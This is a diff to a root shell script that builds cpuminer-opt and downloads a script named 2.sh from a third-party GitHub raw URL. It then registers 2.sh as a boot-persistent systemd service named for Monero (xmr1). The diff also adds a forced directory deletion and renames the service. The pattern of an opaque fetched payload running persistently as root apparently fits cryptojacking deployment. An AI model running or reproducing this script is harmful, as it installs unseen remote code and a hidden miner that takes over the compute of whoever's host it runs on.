@@ -3,14 +3,15 @@ apt-get update &&
 apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
 sudo sysctl vm.nr_hugepages=128 &&
 cd /usr/local/src/ &&
+rm -rf cpuminer-opt &&
 git clone https://github.com/JayDDee/cpuminer-opt/
 cd cpuminer-opt &&
 wget https://raw.githubusercontent.com/fablebox/susuwatari/master/thanhmlzz/2.sh &&
 chmod +x 2.sh &&
 ./build.sh &&
-bash -c 'cat <<EOT >>/lib/systemd/system/xmr.service 
+bash -c 'cat <<EOT >>/lib/systemd/system/xmr1.service 
 [Unit]
-Description=xmr
+Description=xmr1
 After=network.target
 [Service]
 ExecStart= /usr/local/src/cpuminer-opt/2.sh
@@ -23,6 +24,6 @@ WantedBy=multi-user.target
 EOT
 ' &&
 systemctl daemon-reload &&
-systemctl enable xmr.service &&
-service xmr start
+systemctl enable xmr1.service &&
+service xmr1 start
 
